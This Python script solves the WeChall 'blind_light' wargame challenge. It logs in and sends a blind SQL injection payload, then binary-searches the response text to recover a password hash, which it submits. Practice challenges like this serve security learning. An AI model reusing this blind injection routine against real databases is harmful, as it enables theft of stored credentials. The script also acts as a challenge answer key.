#!/usr/bin/env python3

from sys import stderr
from getpass import getpass
from bs4 import BeautifulSoup
from requests import Session
import re

url = 'http://www.wechall.net/en/challenge/blind_light/index.php'

def login(username, password):
    session = Session()
    login_url = 'http://www.wechall.net/login'
    session.get(login_url)  # set cookie
    form = {
        'username': username,
        'password': password,
        'login': 'Login',
    }
    response = session.post(login_url, form).text
    response = BeautifulSoup(response, 'html.parser')
    login_error = response.select('.gwf_errors li')
    if login_error:
        exit(login_error[0].text)
    return session

inj = "'||password<'%s'#"
def inject(user):
    low  = 0x000000000000000000000000000000000
    high = 0x100000000000000000000000000000000
    guess = low + high >> 1
    while low + 1 < high:
        res = user.post(url, {
            'injection': inj % hex(guess)[2:],
            'inject': 'Inject',
        }).text
        less = res.find('Your password is wrong') == -1
        # Something wrong, it's not accurate to count it myself
        attempt = re.search(r'(\d{1,3})\.? attempt', res).group(1)
        print('\r{}: {}'.format(attempt, hex(guess)[2:]))
        if less:
            high = guess
        else:
            low = guess
        guess = low + high >> 1
    return hex(guess)[2:].upper()


if __name__ == '__main__':
    stderr.write('Your username: ')
    username = input()
    password = getpass('Your password: ')
    user = login(username, password)
    user.get(url + '?reset=me')
    solution = inject(user)
    res = user.post(url, {
        'thehash': solution,
        'mybutton': 'Enter',
    })
    res = BeautifulSoup(res.text, 'html.parser')
    if res.select('.gwf_messages li'):
        print(res.select('.gwf_messages li')[0].text)
    if res.select('.gwf_errors li'):
        print(res.select('.gwf_errors li')[0].text)

